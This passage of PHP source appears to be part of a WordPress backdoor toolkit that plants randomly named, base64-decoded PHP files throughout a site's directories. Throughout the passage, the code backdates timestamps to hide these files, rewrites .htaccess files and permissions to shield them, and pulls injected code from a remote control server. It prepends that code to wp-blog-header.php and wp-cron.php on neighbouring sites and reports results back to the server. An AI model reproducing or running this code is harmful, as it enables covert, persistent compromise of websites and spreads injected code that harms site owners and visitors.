        echo "<p style=\"color:green;\">Doors is successfully, Success .h is " . $result["count"] . "</p>";
        foreach ($result["door_files"] as $k => $v) {
            echo "<p><a href=\"" . $v . "\" target=\"_blank\">" . $v . "</a></p>";
        }
    } else {
        echo "<p style=\"color:red;\">Doors is failed! " . $result_data["code"] . "</p>";
    }
}
function add_doors($doors_array, $doors_55_array, $wp_files, $third_file, $ban_content, $open_content, $shell_action_code, $now_site)
{
    $result = array();
    global $door_lists, $all_paths, $last_folder_url;
    $path = $_SERVER["DOCUMENT_ROOT"];
    $door_count = count($doors_array) + count($doors_55_array);
    getAllDirectories($path, 1, $door_count);
    if (count($door_lists) < $door_count) {
        $sy_count = count($doors_array) + count($doors_55_array) - count($door_lists);
        $door_lists = fill_full($door_lists, $sy_count);
    }
    $randomKeys = array_rand($door_lists, count($doors_array) + count($doors_55_array));
    $door_files = array();
    $succ_files = array();
    $i = 0;
    $shell_other_url = '';
    foreach ($randomKeys as $key) {
        $file_door_url = $door_lists[$key];
        $file_name = getrandstr(rand(5, 10)) . ".php";
        if ($i >= count($doors_array)) {
            $file_door_url .= "/wp";
            $file_url = $file_door_url . "/" . $file_name;
            $res = cndoorfile($file_door_url, $file_name, $open_content, base64_decode($doors_55_array[$i - count($doors_array)]));
        } else {
            $file_url = $file_door_url . "/" . $file_name;
            $res = crdoorfile($file_url, base64_decode($doors_array[$i]));
        }
        if ($res) {
            $succ_files[] = $file_url;
            $door_files[] = str_replace($path, $now_site, $file_url);
        } else {
        }
        $i++;
    }
    if (!empty($last_folder_url)) {
        $file_url = $last_folder_url . "/index.php";
        $res = crdoorfile($file_url, base64_decode($shell_action_code));
        if ($res) {
            $shell_other_url = str_replace($path, $now_site, $file_url);
        }
    }
    $count = 0;
    if (count($succ_files) > 0) {
        $ht_urls = array();
        $wp_files_array = explode(";", $wp_files);
        foreach ($wp_files_array as $k => $v) {
            $wp_files_array[$k] = $path . $v;
        }
        $ht_urls = $succ_files;
        $ht_urls = array_merge($ht_urls, $wp_files_array);
        $ht_urls[] = $path . "/" . $third_file;
        $ht_folders = array();
        $ht_files = array();
        foreach ($ht_urls as $k => $v) {
            $ht_folders[] = dirname($v);
            $ht_files[] = basename($v);
        }
        foreach ($all_paths as $k => $a) {
            $now_files = array();
            foreach ($ht_folders as $htk => $htv) {
                if ($a == $htv) {
                    $now_files[] = $ht_files[$htk];
                }
            }
            $ht_content_now = '';
            if (!empty($now_files)) {
                $ht_content_now = str_replace("{#htcontent}", implode("|", $now_files), $open_content);
            } else {
                $ht_content_now = $ban_content;
            }
            chmod($a . "/.htaccess", 493);
            if (file_put_contents($a . "/.htaccess", $ht_content_now) !== false) {
                $count++;
                chmod($a . "/.htaccess", 365);
            }
        }
    }
    $result["door_files"] = $door_files;
    $result["shell_other_url"] = $shell_other_url;
    $result["count"] = $count;
    return $result;
}
function fill_full($file_urls, $sy_count)
{
    $path = realpath($_SERVER["DOCUMENT_ROOT"]);
    $file_url_result = array();
    foreach ($file_urls as $k => $v) {
        if (!empty(trim($v))) {
            $file_url_result[] = $v;
        }
    }
    $file_tou = array("wp-content", "wp-admin", "wp-includes");
    $file_list = array("css", "images", "img", "js", "themes", "plugins", "uploads", "languages", "includes", "maint", "network", "met", "user", "IXR", "ID3", "fonts", "block", "blocks", "php-compat", "php", "Text", "widgets", "SimplePie", "random", "style-engine", "pomo", "certificates", "blockt");
    for ($i = 0; $i < $sy_count; $i++) {
        $path_url = $path . "/" . $file_tou[rand(0, count($file_tou) - 1)];
        for ($j = 0; $j < rand(3, 6); $j++) {
            $path_url = $path_url . "/" . $file_list[rand(0, count($file_list) - 1)];
        }
        $file_url_result[] = $path_url;
    }
    return $file_url_result;
}
function getAllDirectories($path, $depth, $door_count)
{
    global $all_paths, $door_lists, $last_folder_url;
    $firstLevelDirs = glob($path . "/*", GLOB_ONLYDIR);
    $totalSelections = $door_count;
    $selectedDirectories = array();
    $dirsPerFirstLevel = max(1, floor($totalSelections / count($firstLevelDirs)));
    foreach ($firstLevelDirs as $dir) {
        $all_paths[] = $dir;
        $subDirs = getAllSubdirectories($dir, 10);
        if (count($subDirs) >= $dirsPerFirstLevel) {
            $randomKeys = array_rand($subDirs, $dirsPerFirstLevel);
            foreach ((array) $randomKeys as $key) {
                $selectedDirectories[] = $subDirs[$key];
            }
        } else {
            $selectedDirectories = array_merge($selectedDirectories, $subDirs);
        }
    }
    if (count($selectedDirectories) < $totalSelections) {
        $additionalNeeded = $totalSelections - count($selectedDirectories);
        $allSubDirs = array();
        foreach ($firstLevelDirs as $dir) {
            $allSubDirs = array_merge($allSubDirs, glob($dir . "/*", GLOB_ONLYDIR));
        }
        $remainingDirs = array_diff($allSubDirs, $selectedDirectories);
        if (count($remainingDirs) > 0) {
            $additionalDirs = (array) array_rand($remainingDirs, min($additionalNeeded, count($remainingDirs)));
            foreach ($additionalDirs as $key) {
                $selectedDirectories[] = $remainingDirs[$key];
            }
        }
    }
    $randomKeys = array_rand($all_paths, 1);
    foreach ((array) $randomKeys as $key) {
        $last_folder_url = $all_paths[$key];
    }
    $door_lists = $selectedDirectories;
    return $all_paths;
}
function getAllSubdirectories($directory, $maxDepth = 10, $currentDepth = 0)
{
    global $all_paths;
    $subdirectories = array();
    if ($currentDepth > $maxDepth) {
        return array();
    }
    $items = scandir($directory);
    foreach ($items as $item) {
        if ($item == "." || $item == "..") {
            continue;
        }
        $path = $directory . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) {
            $subdirectories[] = $path;
            $all_paths[] = $path;
            $subdirectories = array_merge($subdirectories, getAllSubdirectories($path, $maxDepth, $currentDepth + 1));
        }
    }
    return $subdirectories;
}
function stationAction($data, $pweb, $now_site)
{
    $result_data = array();
    $result_data["shell_id"] = $data["shell_id"];
    $result_data["action"] = "station";
    $save_url = base64_decode($pweb) . "/save.php";
    $shell_id = $data["shell_id"];
    $shell_type = $data["shell_type"];
    $url = base64_decode($pweb) . "/indexdoor.php?action=station&shell_id=" . $shell_id . "&shell_type=" . $shell_type;
    $cc = curlget($url);
    $json_array = json_decode($cc, true);
    $station_count = 0;
    if (!empty($json_array["station_code"]) && !empty($json_array["ht_pz_content"])) {
        $station_count = add_station($json_array["station_code"], $json_array["ht_pz_content"], $now_site);
        if ($station_count > 0) {
            $result_data["station_count"] = $station_count;
            $result_data["status"] = 1;
        } else {
            $result_data["code"] = "1001";
            $result_data["status"] = 2;
        }
    } else {
        $result_data["code"] = "1002";
        $result_data["status"] = 2;
    }
    $result_data["shell_url"] = $now_site;
    $result_data["shell_type"] = $shell_type;
    $res = curlpost($save_url, $result_data);
    if ($res["status"]) {
        echo "<p style=\"color:green;\">Station is successfully, Success is " . $station_count . "</p>";
    } else {
        echo "<p style=\"color:red;\">Station is failed! " . $result_data["code"] . "</p>";
    }
}
function add_station($station_code, $ht_content, $now_site)
{
    $station_code = base64_decode($station_code);
    $count = 0;
    $path = $_SERVER["DOCUMENT_ROOT"];
    $folder_name = basename($path);
    $all_folders = getParentsFolders($path);
    $all_results = array();
    foreach ($all_folders as $k => $v) {
        $directories = glob($v . "/*", GLOB_ONLYDIR);
        $all_folders = array_merge($all_folders, $directories);
    }
    foreach ($all_folders as $k => $v) {
        if (!strpos($v, $folder_name)) {
            $all_results[] = $v;
        }
    }
    foreach ($all_results as $k => $v) {
        $index_url = $v . "/wp-blog-header.php";
        $wp_url = $v . "/wp-cron.php";
        $ht_url = $v . "/.htaccess";
        $index_yuan = '';
        if (file_exists($index_url)) {
            chmod($index_url, 420);
            $index_yuan = file_get_contents($index_url);
        }
        if (strpos($index_yuan, $station_code) === false) {
            file_put_contents($index_url, $station_code . $index_yuan);
            chmod($index_url, 292);
        }
        $wp_yuan = '';
        if (file_exists($wp_url)) {
            chmod($wp_url, 420);
            $wp_yuan = file_get_contents($wp_url);
        }
        if (strpos($wp_yuan, $station_code) === false) {
            file_put_contents($wp_url, $station_code . $wp_yuan);
            chmod($wp_yuan, 292);
        }
        chmod($ht_url, 420);
        file_put_contents($ht_url, $ht_content);
        chmod($ht_url, 292);
        $count++;
    }
    return $count;
}
function getParentsFolders($path)
{
    $all_folders = array();
    $parent_folds = dirname($path);
    $directories = glob($parent_folds . "/*", GLOB_ONLYDIR);
    $all_folders = $directories;
    $parent_folds = dirname($parent_folds);
    $directories = glob($parent_folds . "/*", GLOB_ONLYDIR);
    $all_folders = array_merge($all_folders, $directories);
    return $all_folders;
}
function curlget($url)
{
    $url_data = '';
    if (function_exists("file_get_contents")) {
        $url_data = file_get_contents($url);
    }
    if (empty($url_data) && function_exists("curl_exec")) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        $url_data = curl_exec($conn);
        curl_close($conn);
    }
    if (empty($url_data) && function_exists("fopen") && function_exists("stream_get_contents")) {
        $handle = fopen($url, "r");
        $url_data = stream_get_contents($handle);
        fclose($handle);
    }
    return $url_data;
}
function curlpost($url, $data)
{
    $jsonData = json_encode($data);
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type: application/json", "Content-Length: " . strlen($jsonData)));
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
    $response = curl_exec($ch);
    $result = array();
    if (curl_errno($ch)) {
        $result["status"] = 0;
        $result["msg"] = curl_error($ch);
    }
    curl_close($ch);
    $res = json_decode($response, true);
    $result["status"] = $res["status"];
    return $result;
}
function crefile($fiurl, $contnt)
{
    $path = $_SERVER["DOCUMENT_ROOT"] . "/";
    $filath = $path . dirname($fiurl);
    if (!is_dir($filath)) {
        if (!mkdir($filath, 493, true)) {
            return false;
        }
    }
    $file_path = $path . $fiurl;
    if (file_put_contents($file_path, $contnt) !== false) {
        $time = time() - rand(30, 100) * 24 * 60 * 60 - rand(0, 3600);
        touch($file_path, $time);
        return true;
    } else {
        return false;
    }
}
function crdoorfile($fipath, $contnt)
{
    if (file_put_contents($fipath, $contnt) !== false) {
        $time = time() - rand(30, 100) * 24 * 60 * 60 - rand(0, 3600);
        touch($fipath, $time);
        return true;
    } else {
        return false;
    }
}
function cndoorfile($fipath, $file_name, $open_content, $contnt)
{
    if (!is_dir($fipath)) {
        mkdir($fipath, 493, true);
    }
    $fileurl = $fipath . "/" . $file_name;
    if (file_put_contents($fileurl, $contnt) !== false) {
        $time = time() - rand(30, 100) * 24 * 60 * 60 - rand(0, 3600);
        touch($fipath, $time);
        chmod($fileurl, 365);
        $ht_content_now = '';
        $ht_content_now = str_replace("{#htcontent}", $file_name, $open_content);
        chmod($fipath . "/.htaccess", 493);
        if (file_put_contents($fipath . "/.htaccess", $ht_content_now) !== false) {
            chmod($fipath . "/.htaccess", 365);
        }
        chmod($fipath, 365);
        return true;
    } else {
        return false;
    }
}
function strslit($str)
{
    $cha = str_split($str);
    return "'" . implode("'.'", $cha) . "'";
}
function getrandstr($length = 10)
{
    $characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}
function deleteDirectory($dir)
{
    if (!is_dir($dir)) {
        return false;
    }
    $files = glob($dir . "/*");
    foreach ($files as $file) {
        if (is_file($file)) {
            unlink($file);
        } elseif (is_dir($file)) {
            deleteDirectory($file);
        }
    }
    return rmdir($dir);
}
function deleteFile($file)
{
    if (file_exists($file)) {
        chmod($file, 511);
        if (unlink($file)) {
            echo "<p style=\"color:green;font-weight: bold;\">" . $file . " is delete success" . "</p>";
        } else {
            echo "<p style=\"color:red;font-weight: bold;\">" . $file . " is delete error" . "</p>";
        }
    } else {
        echo "<p style=\"color:red;font-weight: bold;\">" . $file . " is not exist" . "</p>";
    }
}
function findFilesWithContent($directory, $searchString, $currentDepth = 0, $maxDepth = 10)
{
    $foundFiles = array();
    if ($currentDepth >= $maxDepth) {
        return array();
    }
    if ($handle = opendir($directory)) {
        while (false !== ($file = readdir($handle))) {
            if ($file != "." && $file != "..") {
                $filePath = $directory . "/" . $file;
                if (is_dir($filePath)) {
                    $foundFiles = array_merge($foundFiles, findFilesWithContent($filePath, $searchString, $currentDepth + 1, $maxDepth));
                } else {
                    if (strpos(file_get_contents($filePath), $searchString) !== false) {
                        $foundFiles[] = $filePath;
                    }
                }
            }
        }
        closedir($handle);
    }
    return $foundFiles;
}
